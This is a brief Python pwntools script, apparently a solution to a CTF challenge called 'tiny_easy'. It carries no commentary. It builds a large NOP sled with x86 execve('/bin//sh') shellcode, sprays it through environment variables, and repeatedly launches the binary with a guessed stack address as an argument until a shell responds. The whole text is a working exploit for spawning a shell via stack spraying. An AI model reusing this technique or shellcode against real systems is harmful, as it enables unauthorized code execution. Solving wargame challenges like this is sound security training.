from pwn import*

stack_addr=  0xff8da111
shellcode = '\x90'*5000
shellcode += '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68'
shellcode += '\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89'
shellcode += '\xe1\x89\xc2\xb0\x0b\xcd\x80\x90\x90'

p_argv = p32(stack_addr)
p_argv += shellcode 

p_env = {}


for i in range(100):
	p_env[str(i)]=shellcode
	p = process(executable = './tiny_easy', argv=p_argv, env=p_env)
	try:
		p.sendline('ls')
		p.recv(100)
	except:
		print 'failed'
		continue


	p.interactive()

